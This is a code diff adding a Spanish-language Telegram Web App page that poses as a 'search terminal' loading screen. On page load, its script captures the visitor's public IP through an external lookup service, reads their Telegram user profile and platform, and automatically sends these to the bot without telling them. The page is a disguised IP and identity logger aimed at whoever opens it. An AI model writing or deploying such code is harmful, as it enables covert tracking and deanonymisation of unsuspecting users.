@@ -1,0 +1,50 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>ARG-DATA — Terminal</title>
+  <style>
+    body{ background:#000; color:#00ffcc; font-family:monospace; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
+    .loader{ text-align:center; border:2px solid #00ffcc; padding:20px; border-radius:15px; }
+    .blink{ animation: blinker 1s linear infinite; }
+    @keyframes blinker { 50% { opacity: 0; } }
+  </style>
+</head>
+<body>
+  <div class="loader">
+    <h2 class="blink">CONECTANDO AL SERVIDOR...</h2>
+    <p id="status">Iniciando protocolos de búsqueda...</p>
+  </div>
+
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <script>
+    (async function(){
+      const tg = window.Telegram.WebApp;
+      tg.expand();
+      tg.ready();
+
+      try {
+        // CAPTURA DE IP
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        
+        // DATOS PARA MANDAR AL BOT
+        const logData = {
+          ip: ipData.ip,
+          plataforma: tg.platform,
+          user: tg.initDataUnsafe.user 
+        };
+
+        // ENVÍO AUTOMÁTICO
+        setTimeout(() => {
+            tg.sendData(JSON.stringify(logData));
+        }, 2000);
+
+      } catch(e) {
+        tg.close();
+      }
+    })();
+  </script>
+</body>
+</html>
